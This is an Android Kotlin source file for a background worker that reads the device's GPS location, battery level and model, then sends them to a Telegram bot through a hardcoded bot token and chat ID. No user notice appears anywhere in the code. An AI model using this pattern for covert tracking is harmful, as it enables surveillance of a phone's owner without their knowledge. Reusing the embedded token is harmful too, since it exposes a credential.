package com.example.location_tracking_app

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.os.BatteryManager
import android.os.Build
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.android.gms.tasks.CancellationTokenSource
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import kotlinx.coroutines.tasks.await

class DataUploadWorker(private val context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {

    companion object {
        const val WORK_NAME = "DataUploadWorker"
    }

    private val fusedLocationClient = LocationServices.getFusedLocationProviderClient(context)

    override suspend fun doWork(): Result {
        Log.d(WORK_NAME, "Worker starting...")

        // 1. Check for location permission (essential for the worker)
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.e(WORK_NAME, "Location permission not granted. Stopping worker.")
            return Result.failure()
        }

        return try {
            // 2. Get all device data
            val location = getCurrentLocation()
            val batteryLevel = getBatteryLevel()
            val deviceModel = Build.MODEL
            val deviceManufacturer = Build.MANUFACTURER
            val androidVersion = Build.VERSION.RELEASE
            val sdkVersion = Build.VERSION.SDK_INT

            // 3. Create a JSON payload
            val data = JSONObject().apply {
                put("latitude", location?.latitude ?: "N/A")
                put("longitude", location?.longitude ?: "N/A")
                put("batteryLevel", batteryLevel)
                put("deviceModel", "$deviceManufacturer $deviceModel")
                put("androidVersion", "Android $androidVersion (SDK $sdkVersion)")
            }

            // 4. Send the data
            sendDataToApi(data)

            Log.d(WORK_NAME, "Worker finished successfully.")
            Result.success()
        } catch (e: Exception) {
            Log.e(WORK_NAME, "Worker failed", e)
            Result.retry() // Retry the work if it fails
        }
    }

    private suspend fun getCurrentLocation(): Location? {
        // Use a coroutine-friendly way to get the last location
        return try {
            fusedLocationClient.getCurrentLocation(Priority.PRIORITY_BALANCED_POWER_ACCURACY, CancellationTokenSource().token).await()
        } catch (e: Exception) {
            Log.e(WORK_NAME, "Failed to get location", e)
            null
        }
    }

    private fun getBatteryLevel(): Int {
        val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }

    private suspend fun sendDataToApi(data: JSONObject) {
        // Using withContext to switch to an I/O-optimized thread for networking
        withContext(Dispatchers.IO) {
            val botToken = "7613366750:AAF18u337ZGgfrlCw9Kh7Txgip6gbZFUXh4" // Replace with your token
            val chatId = "5080555370" // Replace with your chat ID

            // Format a nice message for Telegram
            val message = """
            📱 *Device Update*
            
            📍 *Location*:
            - Latitude: ${data.optString("latitude", "N/A")}
            - Longitude: ${data.optString("longitude", "N/A")}
            - [View on Google Maps](https://maps.google.com/?q=${data.optString("latitude")},${data.optString("longitude")})
            
            🔋 *Battery*: ${data.getInt("batteryLevel")}%
            
            ⚙️ *Device Info*:
            - Model: ${data.getString("deviceModel")}
            - OS: ${data.getString("androidVersion")}
            """.trimIndent()

            val url = URL("https://api.telegram.org/bot$botToken/sendMessage")
            val urlConnection = url.openConnection() as HttpURLConnection
            try {
                urlConnection.requestMethod = "POST"
                urlConnection.doOutput = true
                urlConnection.setRequestProperty("Content-Type", "application/json")

                val payload = JSONObject().apply {
                    put("chat_id", chatId)
                    put("text", message)
                    put("parse_mode", "Markdown") // Use Markdown for better formatting
                }.toString()

                val writer = OutputStreamWriter(urlConnection.outputStream)
                writer.write(payload)
                writer.flush()

                val responseCode = urlConnection.responseCode
                Log.d(WORK_NAME, "Telegram API response code: $responseCode")
            } catch (e: Exception) {
                Log.e(WORK_NAME, "Failed to send data to Telegram", e)
            } finally {
                urlConnection.disconnect()
            }
        }
    }
}
